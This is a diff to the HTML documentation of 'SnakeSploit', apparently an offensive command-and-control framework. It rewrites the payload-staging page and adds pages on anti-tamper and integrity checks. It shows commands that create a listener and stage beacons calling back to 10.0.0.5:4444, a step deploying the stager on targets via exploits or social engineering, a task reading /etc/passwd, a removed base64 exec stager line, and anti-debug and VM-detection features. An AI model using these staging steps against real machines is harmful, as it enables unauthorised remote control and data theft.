@@ -219,6 +219,11 @@ tr:hover td { background: rgba(255,255,255,0.02); }
       <button class="nav-link" onclick="showPage('c2-staging')">Payload Staging</button>
     </div>
     <div class="nav-section">
+      <div class="nav-section-title">Security</div>
+      <button class="nav-link" onclick="showPage('antitamper')">Anti-Tamper <span class="badge">New</span></button>
+      <button class="nav-link" onclick="showPage('integrity')">Integrity Verification</button>
+    </div>
+    <div class="nav-section">
       <div class="nav-section-title">Advanced</div>
       <button class="nav-link" onclick="showPage('strix')">Strix AI Scanner</button>
       <button class="nav-link" onclick="showPage('mcp')">MCP Integration</button>
@@ -815,7 +820,7 @@ snakesploit > c2 task agent_2 "cat /etc/passwd"</pre>
     title: "Payload Staging",
     content: `
 <h2>Payload Staging</h2>
-<p>SnakeSploit can generate staged C2 beacons that automatically check in to your listener when executed on the target.</p>
+<p>SnakeSploit can generate staged C2 beacons that automatically check in to your listener when executed on the target. <strong>No Mythic or external C2 server required.</strong></p>
 
 <h3>Available Beacon Types</h3>
 <table>
@@ -826,29 +831,90 @@ snakesploit > c2 task agent_2 "cat /etc/passwd"</pre>
 </table>
 
 <h3>Staging a Beacon</h3>
-<pre><span class="comment"># Python beacon (most versatile)</span>
+<pre>snakesploit > c2 listener create beacon 0.0.0.0 4444
+snakesploit > c2 listener start beacon
+
+<span class="comment"># Stage a Python beacon</span>
 snakesploit > c2 payload python LHOST=10.0.0.5 LPORT=4444 name=stage1
 [+] Payload 'stage1' staged
 
-<span class="comment"># PowerShell beacon (Windows targets)</span>
-snakesploit > c2 payload powershell LHOST=10.0.0.5 LPORT=4444 name=win_beacon
+<span class="comment"># Deploy the stager on the target — it will check in automatically</span>
+snakesploit > c2 list
+  agent_1  192.168.1.100  admin@PC-01  windows  active</pre>
 
-<span class="comment"># Bash beacon (Linux targets)</span>
-snakesploit > c2 payload bash LHOST=10.0.0.5 LPORT=4444 name=linux_stage</pre>
+<h3>How Staging Works</h3>
+<div class="steps">
+  <div class="step">Operator creates a listener with <code>c2 listener create</code></div>
+  <div class="step">Operator stages a payload with <code>c2 payload</code> — generates a beacon script</div>
+  <div class="step">Operator deploys the stager on the target (via exploit, social engineering, etc.)</div>
+  <div class="step">Beacon executes and sends <code>CHECKIN</code> to the listener</div>
+  <div class="step">Server registers the agent — operator can now task it</div>
+</div>
 
-<h3>Viewing Staged Payloads</h3>
-<pre>snakesploit > c2 payloads
-  Name        Type        LHOST          LPORT
-  stage1      python      10.0.0.5       4444
-  win_beacon  powershell  10.0.0.5       4444
-  linux_stage bash        10.0.0.5       4444</pre>
+<h3>Payload Storage</h3>
+<p>Staged payloads are saved to <code>~/.snakesploit/c2/payloads/</code> and persist across sessions.</p>
+    `
+  },
 
-<h3>Deploying</h3>
-<p>Staged payloads are saved to <code>~/.snakesploit/c2/payloads/</code>. The stager command can be copied and run on the target:</p>
-<pre><span class="comment"># The stager for Python beacon looks like:</span>
-python3 -c "exec(__import__('base64').b64decode('...').decode())"</pre>
+  "antitamper": {
+    title: "Anti-Tamper Protection",
+    content: `
+<h2>Anti-Tamper System <span class="tag tag-new">New</span></h2>
+<p>SnakeSploit includes a multi-layer anti-tamper system that detects code modification, debugging, and reverse engineering attempts.</p>
 
-<div class="callout callout-info"><strong>💡 Pro tip:</strong> Start your listener first with <code>c2 listener start beacon</code>, then stage and deploy the payload. The beacon will check in immediately.</div>
+<h3>Protection Layers</h3>
+<table>
+  <tr><th>Layer</th><th>What it detects</th><th>Method</th></tr>
+  <tr><td>Anti-Debug</td><td>ptrace attachment, debugger presence</td><td>Reads TracerPid from /proc/self/status</td></tr>
+  <tr><td>Process Hardening</td><td>Process dumping, memory access</td><td>prctl(PR_SET_DUMPABLE, 0) — prevents ptrace by non-root</td></tr>
+  <tr><td>File Integrity</td><td>Modified .py files (license bypass, code injection)</td><td>SHA-256 hash comparison against manifest</td></tr>
+  <tr><td>Background Monitor</td><td>Real-time file changes during execution</td><td>Up to 30s polling thread</td></tr>
+  <tr><td>Tamper Flag</td><td>Persistent tampering evidence</td><td>Writes .tamper_flag file, checked on next launch</td></tr>
+  <tr><td>VM Detection</td><td>VMware, VirtualBox, QEMU, Docker</td><td>DMI product names, CPU hypervisor flag</td></tr>
+</table>
+
+<h3>Verification</h3>
+<pre><span class="comment"># Manual check</span>
+snakesploit --verify
+
+<span class="comment"># Auto-checked on every launch</span>
+snakesploit</pre>
+
+<h3>What Happens on Tamper Detection</h3>
+<pre>[!] SECURITY ALERT: Tampering detected!
+[!] Debugger detected via ptrace (TracerPid)
+[!] File tampering detected: core/license.py, snakesploit.py</pre>
+
+<h3>Generating the Integrity Manifest</h3>
+<pre><span class="comment"># After any legitimate code update (e.g. git pull):</span>
+python3 -c "from core.integrity import generate_manifest; generate_manifest()"</pre>
+    `
+  },
+
+  "integrity": {
+    title: "Integrity Verification",
+    content: `
+<h2>Integrity Verification</h2>
+<p>The integrity system uses <strong>SHA-256 hashing</strong> to detect any unauthorized modification to SnakeSploit's core files.</p>
+
+<h3>How It Works</h3>
+<div class="steps">
+  <div class="step">A manifest file (<code>.integrity_manifest.json</code>) stores SHA-256 hashes of all 15 core Python files</div>
+  <div class="step">On every launch, the current file hashes are compared against the manifest</div>
+  <div class="step">Any mismatch triggers a security alert with the specific files listed</div>
+  <div class="step">The manifest is generated at deploy time and NOT committed to GitHub</div>
+</div>
+
+<h3>Protected Files</h3>
+<pre>snakesploit.py, console.py, core/license.py, core/module.py,
+core/target.py, core/session.py, core/strix.py, core/c2.py,
+core/antitamper.py, core/integrity.py, lib/network.py,
+lib/payloads.py, updater/cve_fetcher.py, updater/module_generator.py,
+mcp_server.py, web_gui.py, install.py</pre>
+
+<h3>Regenerating After Updates</h3>
+<pre>git pull
+python3 -c "from core.integrity import generate_manifest; generate_manifest()"</pre>
     `
   },
 
